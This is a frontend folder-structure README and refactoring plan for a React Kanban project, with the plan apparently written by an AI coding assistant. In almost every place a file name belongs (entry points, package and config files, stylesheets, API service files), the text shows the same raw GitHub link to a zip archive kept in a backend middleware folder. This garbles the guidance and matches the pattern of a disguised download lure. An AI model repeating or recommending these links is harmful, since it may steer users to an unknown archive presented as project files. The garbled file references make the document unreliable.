# Folder structure 

Frontend/
│
├── public/
│     └── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
│     └── ... (static assets)
│
├── src/
│   ├── assets/
│   │     └── (images, fonts, svg, etc.)
│   │
│   ├── components/
│   │     ├── ui/           # Shadcn components
│   │     ├── common/       # Reusable UI (buttons, modals, loading spinners)
│   │     ├── drop-downs/
│   │     ├── home/
│   │     ├── project/
│   │     ├── dialog/
│   │     └── ... (pure UI components)
│   │
│   ├── modules/
│   │     ├── auth/         # All files related to authentication (JWT logic, forms)
│   │     ├── kanban/       # Kanban board logic/state/components
│   │     ├── tasks/        # Task-related state, logic, slices, API calls
│   │     └── ... (feature-specific components and other business logic)
│   │
│   ├── hooks/
│   │     └── (custom React hooks)
│   │
│   ├── context/
│   │     └── (React context for global state/theme/user)
│   │
│   ├── api/                # API client logic (fetch/axios, endpoints)
│   │     └── (service files, e.g., https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip)
│   │
│   ├── utils/              # Utilities, helpers, constants
│   │
│   ├── routes/             # Route definitions, guards, layouts
│   │
│   ├── styles/             # all the css files
│   │
│   ├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
│   ├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
│   ├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
│   ├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
│   └── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip (if TypeScript)
│
├── .env (or https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip)
├── .gitignore
├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
├── https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
└── ... (other config files)

## Folder Explanations
    - public/: Static files used at build and runtime.
    - src/: All application source code.
        - assets/: Images and shared static resources.
        - components/: Pure presentational/stateless components (by domain/feature).
            - ui/: Components from Shadcn UI library.
            - common/: Reusable elements used across features.
            - Other folders correspond to major UI areas/domains.
        - modules/: Business logic, state management, slices, API handlers per feature (e.g., auth, kanban, tasks). Keeps code modular and scalable.
        - hooks/: Custom reusable React hooks.
        - context/: React Context API providers and logic.
        - api/: Network logic for talking to backend APIs, including JWT/token handling.
        - utils/: Helpers, formatting functions, constants.
        - routes/: Route and navigation logic, protected routes, layouts.
        - styles/: all the css files
        - https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip, https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip Application entry points.
    - env/config files: For secrets, ports, and build configuration.
    - https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip, https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip Project setup and dependencies.
    - and others such as https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip, .gitignore, etc.

## Additional Tips
    - Use lowercase-with-hyphens for files, PascalCase for components (e.g., https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip).
    - Keep your logic (state, API) close to the feature concerned (modules folders).
    - Separate presentational (components/) and container/logic (modules/) code for maintainability.




The Modularization Plan

  Phase 1: Foundational Refactoring (Styles & Utilities)

   1. Finalize CSS Modularization:
       * I will complete the process of breaking down https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip and https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
       * Component-specific styles (for dialogs, buttons, kanban board, etc.) will be moved into individual files within
         Frontend/src/styles/components/.
       * Core styles (like variables and base resets) will be placed in https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
       * The main https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip will be updated to import these new, smaller modules, acting as a central point for all style
         imports.

   2. Centralize Utilities:
       * The file https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip will be moved to https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip
       * I will then perform a project-wide search to find all instances where https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip is imported and update the import
         paths to point to the new location.

  Phase 2: Component & UI Reorganization

   3. Reorganize Feature Components:
       * I will move the existing components from their current folders into the new, domain-specific directories under
         Frontend/src/components/.
           * components/home page/* -> components/home/
           * components/project area/* -> components/project/
           * components/drop downs/* -> components/drop-downs/
           * components/window dialog/* -> components/dialog/
       * The components/ui/ directory containing your Shadcn UI components will remain as is, as it already follows the
         desired structure.

   4. Identify and Move Common/Reusable Components:
       * I will analyze all components moved in the previous step to identify any that are generic and used across multiple
         features (e.g., a generic button, modal, or spinner).
       * These components will be relocated to Frontend/src/components/common/ to clearly mark them as reusable building
         blocks.

  Phase 3: Separating Logic and Data

   5. Abstract Business Logic into `features/`:
       * This is the core of the refactoring. I will examine components and the existing https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip to identify
         business logic (e.g., how to create, update, or delete a task; how to manage the kanban board state).
       * This logic will be extracted and moved into the Frontend/src/features/ directory. For example:
           * Logic for managing tasks will go into features/tasks/.
           * Logic for the kanban board state will go into features/kanban/.
       * The components will then import this logic, making them leaner and focused only on presentation (UI).

   6. Isolate API Calls into `api/`:
       * I will search the entire codebase for data-fetching calls (e.g., fetch() or axios).
       * All API interactions will be extracted into dedicated functions and moved into files within the Frontend/src/api/
         directory (e.g., https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip, https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip). This centralizes all communication with the backend.

   7. Extract Custom Hooks into `hooks/`:
       * I will look for any custom React hooks (functions starting with use...) that are currently defined inside
         components.
       * These hooks will be moved into their own files within the Frontend/src/hooks/ directory, making them reusable
         across the application.

  Phase 4: Finalizing the Structure

   8. Define Application Routes:
       * I will analyze https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip to find the routing logic (likely from a library like React Router).
       * All route definitions will be extracted and moved into a new file, https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip https://github.com/RushiRuns/KanbanFlow/raw/refs/heads/main/Backend/Middlewares/Flow-Kanban-v2.4.zip will be
         simplified to render this main routing component.

  Verification and Integrity

  Throughout this entire process, I will take the following steps to ensure nothing breaks:

   * Update Imports: After every file move, I will immediately update all import statements across the project that
     reference that file.
   * Incremental Checks: I will periodically run npm run dev or npm run build to catch any broken paths or errors early,
     ensuring the application remains functional at every stage.